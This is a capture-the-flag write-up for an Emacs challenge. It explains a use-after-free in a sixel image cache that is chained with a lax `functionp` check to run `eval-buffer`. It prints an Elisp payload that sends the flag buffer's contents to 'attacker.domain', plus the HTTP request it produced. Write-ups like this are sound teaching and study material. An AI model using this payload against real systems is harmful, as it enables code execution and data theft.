# ret2emacs

`decode_sixel` has a fairly obvious use-after-free vulnerability. If `cache` is
evicted, neither the MD5 hashes nor the pointers are zeroed out. Hence,
inserting an image that was previously in the cache will result in
`decode_sixel` returning a freed chunk. This is the first piece of the puzzle.

The second piece of the puzzle is that `sixplayground-make-overlay` takes as a
parameter 'data-or-function'. If this parameter is a function, it will call it
to compute the image data to be inserted.

`functionp` is quite lax, however. It will consider the symbol pointing at an
interactive function to be a function itself. So if we were to call
`sixplayground-make-overlay` with `'eval-buffer` as a parameter, it would
evaluate the Elisp code in the current buffer (and then crash if the code in the
buffer does not produce a valid image).

The gist of our exploit is to:

1. Exploit the use-after-free to inject `'eval-buffer` into the cache.
2. Ensure the buffer begins with valid Elisp code which will carry out the
   desired payload.
3. Insert the image whose data pointer now points at `'eval-buffer`.

The payload the example solution uses is the following:

```elisp
(save-excursion
 (set-buffer (get-buffer "*flag*"))
 (url-retrieve-synchronously (format "http://attacker.domain/%s" (buffer-string)))
 (buffer-string))

```

Which readily submits the flag to the attacker.

```sh
GET /FLAG_GOES_HERE HTTP/1.1
MIME-Version: 1.0
Connection: keep-alive
Extension: Security/Digest Security/SSL
Host: 10.0.2.2:6666
Accept-encoding: gzip
Accept: */*
User-Agent: URL/Emacs Emacs/27.2.50 (X11; x86_64-pc-linux-gnu)

```
